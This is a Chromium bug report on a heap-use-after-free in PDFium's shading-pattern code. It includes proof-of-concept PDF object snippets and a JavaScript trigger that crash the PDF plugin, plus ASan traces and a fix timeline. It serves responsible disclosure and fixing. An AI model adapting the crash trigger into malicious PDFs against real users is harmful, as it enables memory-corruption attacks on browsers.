# Heap-use-after-free in CPDF_ShadingPattern::Load()

| Field | Value |
|-------|-------|
| **Issue ID** | [40094748](https://issues.chromium.org/issues/40094748) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ch...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2019-04-26 |
| **Bounty** | $6,000.00 |

## Description

**VULNERABILITY DETAILS**

This is same bug as 901654. Only free stack is different.

cpdf\_shadingpattern.h class has below mentioned member.  

UnownedPtr<const CPDF\_Object> m\_pShadingObj;  

It is possible to create a pdf file which uses same dictionary for

1. Above mentioned "m\_pShadingObj" of cpdf\_shadingpattern.h class
2. "/D" named item of "/AP" dictionary of a form field.

"CPWL\_AppStream::SetAsPushButton()" has code which deletes "/D" named item from "AP" dictionary.  

....  

Remove("D");  

Remove("R");  

....

It is possible to reach this code section by calling any javascript function which resets the appearance of a form field, such as setting border style.  

After "/D" named item is deleted "m\_pShadingObj" in cpdf\_shadingpattern.h class will have deleted data.  

It is possible to use this deleted m\_pShadingObj, through a repaint of pdf file.

## PDF File

This section of PDF file causes this bug.

{{object 4 0}} <<

stream  

/D  

scn //this fill color operator has property /D.  

BT  

/F1 20 Tf  

50 50 Td  

(Test) Tj  

ET  

endstream  

endobj  

{{object 5 0}} << // This is resource dictionary of pdf page.  

/Pattern 10 0 R // This "/Pattern 10 0 R" dictionary will be used to retrieve information for the pattern used to fill color (scn).  

// So above mentioned property /D will be retrieved from this dictionary.  

// But "10 0 R" is also the dictionary used for a "/AP" dictionary of form field.  

/Font <<F1 7 0 R>>

endobj  

{{object 6 0}} <<  

/FT /Btn  

/Type /Annot  

/Subtype /Widget  

/T (btn1)  

/AP 10 0 R  

/Ff 65536  

/F 4  

/Rect [200 200 400 400]  

/V (t)  

/H /I

endobj  

....  

{{object 10 0}} << // This is the "/AP" dictionary of form field.  

/D <</PatternType 2 /Shading <</Test (a)>> >> // This dictionary will be deleted when border style or any function which resets the appearance of  

// form field is called.

endobj

JavaScript in OpenAction section of PDF file  

**-------------------------** --------------------  

function run()  

{  

btn = this.getField("btn1");  

btn.borderStyle = "dashed";  

}  

app.setTimeOut('run()',4000);

**VERSION**

Chrome Version: [74.0.3729.108] + [stable]  

[76.0.3777.0] + [trunk  

Operating System: [Ubuntu 18.04.2 64 bit]  

[Windows 10 64 bit]

**REPRODUCTION CASE**

1. Save pattern.pdf file and pattern.html to same location.
2. Open pattern.html with chrome.
3. Wait 20 seconds. (20 seconds timeout is added to provide enough time for pdf file to load and perform its' Open Action.).  
   
   PDF plugin process will crash.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: [PDF plugin process]  

Crash State: Address Sanitizer Output

==30107==ERROR: AddressSanitizer: heap-use-after-free on address 0x60600004bd40 at pc 0x55d81cceb381 bp 0x7ffc40b33fb0 sp 0x7ffc40b33fa8  

READ of size 8 at 0x60600004bd40 thread T0 (chrome)  

#0 0x55d81cceb380 in CPDF\_ShadingPattern::Load() ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_shadingpattern.cpp:67:38  

#1 0x55d81cdee391 in CPDF\_RenderStatus::DrawShadingPattern(CPDF\_ShadingPattern\*, CPDF\_PageObject const\*, CFX\_Matrix const&, bool) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:2109:17  

#2 0x55d81ce141ec in CPDF\_RenderStatus::DrawPathWithPattern(CPDF\_PathObject\*, CFX\_Matrix const&, CPDF\_Color const\*, bool) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:2337:5  

#3 0x55d81ce012f6 in CPDF\_RenderStatus::ProcessPathPattern(CPDF\_PathObject\*, CFX\_Matrix const&, int\*, bool\*) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:2350:7  

#4 0x55d81cdfe3f2 in CPDF\_RenderStatus::ProcessPath(CPDF\_PathObject\*, CFX\_Matrix const&) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:1250:3  

#5 0x55d81cdfc3b9 in CPDF\_RenderStatus::ProcessObjectNoClip(CPDF\_PageObject\*, CFX\_Matrix const&) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:1145:14  

#6 0x55d81cdf9eea in CPDF\_RenderStatus::RenderSingleObject(CPDF\_PageObject\*, CFX\_Matrix const&) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:1081:3  

#7 0x55d81ce09700 in CPDF\_RenderStatus::DrawTextPathWithPattern(CPDF\_TextObject const\*, CFX\_Matrix const&, CPDF\_Font\*, float, CFX\_Matrix const\*, bool, bool) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:1976:5  

#8 0x55d81cdfd915 in CPDF\_RenderStatus::ProcessText(CPDF\_TextObject\*, CFX\_Matrix const&, CFX\_PathData\*) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:1745:5  

#9 0x55d81cdfc33a in CPDF\_RenderStatus::ProcessObjectNoClip(CPDF\_PageObject\*, CFX\_Matrix const&) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:1142:14  

#10 0x55d81cdf7268 in CPDF\_RenderStatus::ContinueSingleObject(CPDF\_PageObject\*, CFX\_Matrix const&, PauseIndicatorIface\*) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_renderstatus.cpp:1111:5  

#11 0x55d81cdf5e96 in CPDF\_ProgressiveRenderer::Continue(PauseIndicatorIface\*) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_progressiverenderer.cpp:95:30  

#12 0x55d81cdf48a7 in CPDF\_ProgressiveRenderer::Start(PauseIndicatorIface\*) ././../../third\_party/pdfium/core/fpdfapi/render/cpdf\_progressiverenderer.cpp:44:3  

#13 0x55d829d17547 in (anonymous namespace)::RenderPageImpl(CPDF\_PageRenderContext\*, CPDF\_Page\*, CFX\_Matrix const&, FX\_RECT const&, int, bool, IPDFSDK\_PauseAdapter\*) ././../../third\_party/pdfium/fpdfsdk/fpdf\_view.cpp:120:26  

#14 0x55d829d077fd in RenderPageWithContext(CPDF\_PageRenderContext\*, fpdf\_page\_t\_\_\*, int, int, int, int, int, int, bool, IPDFSDK\_PauseAdapter\*) ././../../third\_party/pdfium/fpdfsdk/fpdf\_view.cpp:906:3  

#15 0x55d829d073de in FPDF\_RenderPageBitmap\_Start ././../../third\_party/pdfium/fpdfsdk/fpdf\_progressive.cpp:59:3  

#16 0x55d829c151c7 in chrome\_pdf::PDFiumEngine::ContinuePaint(int, pp::ImageData\*) ././../../pdf/pdfium/pdfium\_engine.cc:2999:10  

#17 0x55d829c13d13 in chrome\_pdf::PDFiumEngine::Paint(pp::Rect const&, pp::ImageData\*, std::\_\_Cr::vector<pp::Rect, std::\_\_Cr::allocator[pp::Rect](javascript:void(0);) >\*, std::\_\_Cr::vector<pp::Rect, std::\_\_Cr::allocator[pp::Rect](javascript:void(0);) >\*) ././../../pdf/pdfium/pdfium\_engine.cc:839:11  

#18 0x55d829be5874 in chrome\_pdf::OutOfProcessInstance::OnPaint(std::\_\_Cr::vector<pp::Rect, std::\_\_Cr::allocator[pp::Rect](javascript:void(0);) > const&, std::\_\_Cr::vector<PaintManager::ReadyRect, std::\_\_Cr::allocator[PaintManager::ReadyRect](javascript:void(0);) >\*, std::\_\_Cr::vector<pp::Rect, std::\_\_Cr::allocator[pp::Rect](javascript:void(0);) >\*) ././../../pdf/out\_of\_process\_instance.cc:1175:16  

...

0x60600004bd40 is located 0 bytes inside of 56-byte region [0x60600004bd40,0x60600004bd78)  

freed by thread T0 (chrome) here:  

#0 0x55d8160fd9cd in operator delete(void\*) *asan\_rtl*:3  

#1 0x55d81c82b237 in CPDF\_Dictionary::~CPDF\_Dictionary() ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:32:37  

#2 0x55d81c5bf73f in std::\_\_Cr::default\_delete<CPDF\_Object>::operator()(CPDF\_Object\*) const ./../../buildtools/third\_party/libc++/trunk/include/memory:2338:5  

#3 0x55d81c5bf678 in std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> >::reset(CPDF\_Object\*) ./../../buildtools/third\_party/libc++/trunk/include/memory:2651:7  

#4 0x55d81c58bf08 in std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> >::~unique\_ptr() ./../../buildtools/third\_party/libc++/trunk/include/memory:2605:19  

#5 0x55d81c8e0495 in std::\_\_Cr::pair<fxcrt::ByteString const, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >::~~pair() ./../../buildtools/third\_party/libc++/trunk/include/utility:315:29  

#6 0x55d81c8e0468 in void std::\_\_Cr::allocator\_traits<std::\_\_Cr::allocator<std::\_\_Cr::\_\_tree\_node<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, void\*> > >::\_\_destroy<std::\_\_Cr::pair<fxcrt::ByteString const, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > > >(std::\_\_Cr::integral\_constant<bool, false>, std::\_\_Cr::allocator<std::\_\_Cr::\_\_tree\_node<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, void\*> >&, std::\_\_Cr::pair<fxcrt::ByteString const, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >\*) ./../../buildtools/third\_party/libc++/trunk/include/memory:1747:23  

#7 0x55d81c8e034e in void std::\_\_Cr::allocator\_traits<std::\_\_Cr::allocator<std::\_\_Cr::\_\_tree\_node<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, void\*> > >::destroy<std::\_\_Cr::pair<fxcrt::ByteString const, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > > >(std::\_\_Cr::allocator<std::\_\_Cr::\_\_tree\_node<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, void\*> >&, std::\_\_Cr::pair<fxcrt::ByteString const, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >\*) ./../../buildtools/third\_party/libc++/trunk/include/memory:1595:14  

#8 0x55d81c8e01bb in std::\_\_Cr::\_\_tree<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, std::\_\_Cr::\_\_map\_value\_compare<fxcrt::ByteString, std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, std::\_\_Cr::less[fxcrt::ByteString](javascript:void(0);), true>, std::\_\_Cr::allocator<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > > > >::destroy(std::\_\_Cr::\_\_tree\_node<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, void\*>\*) ./../../buildtools/third\_party/libc++/trunk/include/\_\_tree:1860:9  

#9 0x55d81c8e0188 in std::\_\_Cr::\_\_tree<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, std::\_\_Cr::\_\_map\_value\_compare<fxcrt::ByteString, std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, std::\_\_Cr::less[fxcrt::ByteString](javascript:void(0);), true>, std::\_\_Cr::allocator<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > > > >::destroy(std::\_\_Cr::\_\_tree\_node<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, void\*>\*) ./../../buildtools/third\_party/libc++/trunk/include/\_\_tree:1858:9  

#10 0x55d81c8e00e7 in std::\_\_Cr::\_\_tree<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, std::\_\_Cr::\_\_map\_value\_compare<fxcrt::ByteString, std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > >, std::\_\_Cr::less[fxcrt::ByteString](javascript:void(0);), true>, std::\_\_Cr::allocator<std::\_\_Cr::\_\_value\_type<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > > > >::~~\_\_tree() ./../../buildtools/third\_party/libc++/trunk/include/\_\_tree:1848:3  

#11 0x55d81c88ff14 in std::\_\_Cr::map<fxcrt::ByteString, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> >, std::\_\_Cr::less[fxcrt::ByteString](javascript:void(0);), std::\_\_Cr::allocator<std::\_\_Cr::pair<fxcrt::ByteString const, std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> > > > >::~map() ./../../buildtools/third\_party/libc++/trunk/include/map:1090:5  

#12 0x55d81c82b176 in CPDF\_Dictionary::~CPDF\_Dictionary() ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:40:1  

#13 0x55d81c82b22b in CPDF\_Dictionary::~CPDF\_Dictionary() ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:32:37  

#14 0x55d81c5bf73f in std::\_\_Cr::default\_delete<CPDF\_Object>::operator()(CPDF\_Object\*) const ./../../buildtools/third\_party/libc++/trunk/include/memory:2338:5  

#15 0x55d81c5bf678 in std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> >::reset(CPDF\_Object\*) ./../../buildtools/third\_party/libc++/trunk/include/memory:2651:7  

#16 0x55d81c58bf08 in std::\_\_Cr::unique\_ptr<CPDF\_Object, std::\_\_Cr::default\_delete<CPDF\_Object> >::~unique\_ptr() ./../../buildtools/third\_party/libc++/trunk/include/memory:2605:19  

#17 0x55d81d226fd1 in CPWL\_AppStream::Remove(fxcrt::ByteString const&) ././../../third\_party/pdfium/fpdfsdk/pwl/cpwl\_appstream.cpp:1947:3  

#18 0x55d81d21eaef in CPWL\_AppStream::SetAsPushButton() ././../../third\_party/pdfium/fpdfsdk/pwl/cpwl\_appstream.cpp:1308:5  

#19 0x55d81cef7e07 in CPDFSDK\_Widget::ResetAppearance(pdfium::Optional[fxcrt::WideString](javascript:void(0);), bool) ././../../third\_party/pdfium/fpdfsdk/cpdfsdk\_widget.cpp:603:17  

#20 0x55d81cfc9a76 in (anonymous namespace)::UpdateFormField(CPDFSDK\_FormFillEnvironment\*, CPDF\_FormField\*, bool, bool, bool) ././../../third\_party/pdfium/fxjs/cjs\_field.cpp:70:45  

#21 0x55d81cfb599b in (anonymous namespace)::SetBorderStyle(CPDFSDK\_FormFillEnvironment\*, fxcrt::WideString const&, int, fxcrt::ByteString const&) ././../../third\_party/pdfium/fxjs/cjs\_field.cpp:223:9  

#22 0x55d81cfb5148 in CJS\_Field::set\_border\_style(CJS\_Runtime\*, v8::Local[v8::Value](javascript:void(0);)) ././../../third\_party/pdfium/fxjs/cjs\_field.cpp:726:5  

#23 0x55d81d122841 in void JSPropSetter<CJS\_Field, &(CJS\_Field::set\_border\_style(CJS\_Runtime\*, v8::Local[v8::Value](javascript:void(0);)))>(char const\*, char const\*, v8::Local[v8::String](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&) ./../../third\_party/pdfium/fxjs/js\_define.h:103:23  

#24 0x55d81d05fbb9 in CJS\_Field::set\_border\_style\_static(v8::Local[v8::String](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&) ./../../third\_party/pdfium/fxjs/cjs\_field.h:44:3  

...

previously allocated by thread T0 (chrome) here:  

#0 0x55d8160fd16d in operator new(unsigned long) *asan\_rtl*:3  

#1 0x55d81c5b79e3 in pdfium::internal::MakeUniqueResult<CPDF\_Dictionary>::Scalar pdfium::MakeUnique<CPDF\_Dictionary, fxcrt::WeakPtr<fxcrt::StringPoolTemplate[fxcrt::ByteString](javascript:void(0);), std::\_\_Cr::default\_delete<fxcrt::StringPoolTemplate[fxcrt::ByteString](javascript:void(0);) > >&>(fxcrt::WeakPtr<fxcrt::StringPoolTemplate[fxcrt::ByteString](javascript:void(0);), std::\_\_Cr::default\_delete<fxcrt::StringPoolTemplate[fxcrt::ByteString](javascript:void(0);) > >&) ./../../third\_party/pdfium/third\_party/base/ptr\_util.h:56:29  

#2 0x55d81c871680 in CPDF\_SyntaxParser::GetObjectBodyInternal(CPDF\_IndirectObjectHolder\*, CPDF\_SyntaxParser::ParseType) ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_syntax\_parser.cpp:484:9  

#3 0x55d81c8718c3 in CPDF\_SyntaxParser::GetObjectBodyInternal(CPDF\_IndirectObjectHolder\*, CPDF\_SyntaxParser::ParseType) ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_syntax\_parser.cpp:506:11  

#4 0x55d81c8718c3 in CPDF\_SyntaxParser::GetObjectBodyInternal(CPDF\_IndirectObjectHolder\*, CPDF\_SyntaxParser::ParseType) ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_syntax\_parser.cpp:506:11  

#5 0x55d81c80c95c in CPDF\_SyntaxParser::GetIndirectObject(CPDF\_IndirectObjectHolder\*, CPDF\_SyntaxParser::ParseType) ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_syntax\_parser.cpp:559:7  

#6 0x55d81c85618b in CPDF\_Parser::ParseIndirectObjectAt(long, unsigned int) ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_parser.cpp:918:28  

#7 0x55d81c81d582 in CPDF\_Parser::ParseIndirectObject(unsigned int) ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_parser.cpp:867:12  

#8 0x55d81c82ec91 in CPDF\_Document::ParseIndirectObject(unsigned int) ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_document.cpp:196:33  

#9 0x55d81c8412a5 in CPDF\_IndirectObjectHolder::GetOrParseIndirectObject(unsigned int) ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_indirect\_object\_holder.cpp:50:42  

#10 0x55d81c82bd83 in CPDF\_Reference::GetDirect() const ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_reference.cpp:98:35  

#11 0x55d81c810990 in CPDF\_Dictionary::GetDirectObjectFor(fxcrt::ByteString const&) const ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:99:17  

#12 0x55d81c82c0dc in CPDF\_Dictionary::GetDictFor(fxcrt::ByteString const&) const ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:148:26  

#13 0x55d81c80439c in CPDF\_Dictionary::GetDictFor(fxcrt::ByteString const&) ././../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:160:50  

#14 0x55d81ccfa34c in CPDF\_StreamContentParser::FindResourceHolder(fxcrt::ByteString const&) ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:1135:42  

#15 0x55d81ccfc990 in CPDF\_StreamContentParser::FindResourceObj(fxcrt::ByteString const&, fxcrt::ByteString const&) ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:1147:30  

#16 0x55d81cd02570 in CPDF\_StreamContentParser::FindPattern(fxcrt::ByteString const&, bool) ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:1198:7  

#17 0x55d81ccf7e41 in CPDF\_StreamContentParser::Handle\_SetColorPS\_Fill() ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:1058:28  

#18 0x55d81ccf906e in CPDF\_StreamContentParser::OnOperator(fxcrt::StringViewTemplate<char>) ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:569:5  

#19 0x55d81ccbbd5b in CPDF\_StreamContentParser::Parse(unsigned char const\*, unsigned int, unsigned int, unsigned int, std::\_\_Cr::vector<unsigned int, std::\_\_Cr::allocator<unsigned int> > const&) ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_streamcontentparser.cpp:1529:9  

#20 0x55d81ccbacff in CPDF\_ContentParser::Parse() ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_contentparser.cpp:201:33  

#21 0x55d81ccb9043 in CPDF\_ContentParser::Continue(PauseIndicatorIface\*) ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_contentparser.cpp:122:22  

#22 0x55d81ccc804e in CPDF\_PageObjectHolder::ContinueParse(PauseIndicatorIface\*) ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_pageobjectholder.cpp:65:18  

#23 0x55d81ccdcde3 in CPDF\_Page::ParseContent() ././../../third\_party/pdfium/core/fpdfapi/page/cpdf\_page.cpp:79:3  

#24 0x55d829d156ba in FPDF\_LoadPage ././../../third\_party/pdfium/fpdfsdk/fpdf\_view.cpp:345:10  

#25 0x55d829c16dc8 in chrome\_pdf::PDFiumPage::GetPage() ././../../pdf/pdfium/pdfium\_page.cc:129:17  

#26 0x55d829c1b9c9 in chrome\_pdf::PDFiumPage::GetPageFeatures() ././../../pdf/pdfium/pdfium\_page.cc:574:20  

#27 0x55d829c11717 in chrome\_pdf::PDFiumEngine::CalculateVisiblePages() ././../../pdf/pdfium/pdfium\_engine.cc:2871:55  

#28 0x55d829c10b4b in chrome\_pdf::PDFiumEngine::PluginSizeUpdated(pp::Size const&) ././../../pdf/pdfium/pdfium\_engine.cc:755:3  

#29 0x55d829be00d2 in chrome\_pdf::OutOfProcessInstance::OnGeometryChanged(double, float) ././../../pdf/out\_of\_process\_instance.cc:1880:12

**CREDIT INFORMATION**  

Reporter credit: [Uncredited]

## Attachments

- [pattern.html](attachments/pattern.html) (text/plain, 202 B)
- [pattern.pdf](attachments/pattern.pdf) (application/pdf, 1.3 KB)
- [pattern2.html](attachments/pattern2.html) (text/plain, 203 B)
- [pattern2.pdf](attachments/pattern2.pdf) (application/pdf, 1.4 KB)

## Timeline

### cl...@chromium.org (2019-04-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6280435496255488.

### cl...@chromium.org (2019-04-26)

Detailed report: https://clusterfuzz.com/testcase?key=6280435496255488

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 1
Crash Address: 0x60c0000c59c0
Crash State:
  ...see report...
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=473783:473803

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6280435496255488

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### cl...@chromium.org (2019-04-26)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Internals>Plugins>PDF]

### cl...@chromium.org (2019-04-26)

Automatically assigning owner based on suspected regression changelist https://pdfium.googlesource.com/pdfium/+/4cb82ee95256f110489f2b503e70729c44419e74 (Convert more c-style pointers to CFX_UnownedPtr).

If this is incorrect, please let us know why and apply the Test-Predator-Wrong-CLs label. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### mm...@chromium.org (2019-04-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-27)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mm...@chromium.org (2019-04-29)

[Empty comment from Monorail migration]

### ts...@chromium.org (2019-04-29)

So I took another stab at trying to ref-count all of these basic objects, and having failed miserably at it again, cobbled together the patch to whack the current mole at https://bugs.chromium.org/p/chromium/issues/detail?id=956947

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-04-29)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/6ab92c0dbcb75b7f769e58cd56ce5ec789cb3095

commit 6ab92c0dbcb75b7f769e58cd56ce5ec789cb3095
Author: Tom Sepez <tsepez@chromium.org>
Date: Mon Apr 29 21:57:39 2019

Track another orphan from CPWL_AppStream

Bug: chromium:956947
Change-Id: I7ade6c0b3f1cb9e0df50e14d772b601d1eee3845
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/53670
Reviewed-by: Lei Zhang <thestig@chromium.org>
Commit-Queue: Tom Sepez <tsepez@chromium.org>

[modify] https://crrev.com/6ab92c0dbcb75b7f769e58cd56ce5ec789cb3095/fpdfsdk/pwl/cpwl_appstream.cpp


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-04-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/0780abc9ce546dc89d5b00f42aa5ec70efa8c777

commit 0780abc9ce546dc89d5b00f42aa5ec70efa8c777
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Apr 30 03:23:11 2019

Roll src/third_party/pdfium 1c0142f68df1..6ab92c0dbcb7 (1 commits)

https://pdfium.googlesource.com/pdfium.git/+log/1c0142f68df1..6ab92c0dbcb7


git log 1c0142f68df1..6ab92c0dbcb7 --date=short --no-merges --format='%ad %ae %s'
2019-04-29 tsepez@chromium.org Track another orphan from CPWL_AppStream


Created with:
  gclient setdep -r src/third_party/pdfium@6ab92c0dbcb7

The AutoRoll server is located here: https://autoroll.skia.org/r/pdfium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.



BUG=chromium:956947
TBR=dsinclair@chromium.org

Change-Id: I7f4a9804a188f279f9f4e6d987238d5b2d4d6c4a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1589155
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#655111}

[modify] https://crrev.com/0780abc9ce546dc89d5b00f42aa5ec70efa8c777/DEPS


### cl...@chromium.org (2019-04-30)

ClusterFuzz has detected this issue as fixed in range 655110:655111.

Detailed report: https://clusterfuzz.com/testcase?key=6280435496255488

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 1
Crash Address: 0x60c0000c59c0
Crash State:
  CPDF_ShadingPattern::~CPDF_ShadingPattern
  CPDF_ShadingPattern::~CPDF_ShadingPattern
  CPDF_Color::~CPDF_Color
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=473783:473803
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=655110:655111

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6280435496255488

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2019-04-30)

ClusterFuzz testcase 6280435496255488 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2019-05-01)

[Empty comment from Monorail migration]

### ch...@gmail.com (2019-05-03)

[Comment Deleted]

### ch...@gmail.com (2019-05-03)

Attached another similar test case which uses cpwl_appstream.cpp to cause this bug.

Steps
---------
1. Save pattern2.pdf file and pattern2.html to same location.
2. Open pattern2.html with chrome.
3. Wait 20 seconds. (20 seconds timeout is added to provide enough time for pdf file to load and perform its' Open Action.).
  PDF plugin process will crash.

Address Sanitizer Output 
----------------------------------------
* Only free stack is mentioned since allocation and use stacks are same as original report.

0x60600004bf80 is located 0 bytes inside of 64-byte region [0x60600004bf80,0x60600004bfc0)
freed by thread T0 (chrome) here:
    #0 0x55ed3351e9cd in operator delete(void*) _asan_rtl_:3
    #1 0x55ed39cf6b47 in CPDF_Dictionary::~CPDF_Dictionary() ././../../third_party/pdfium/core/fpdfapi/parser/cpdf_dictionary.cpp:32:37
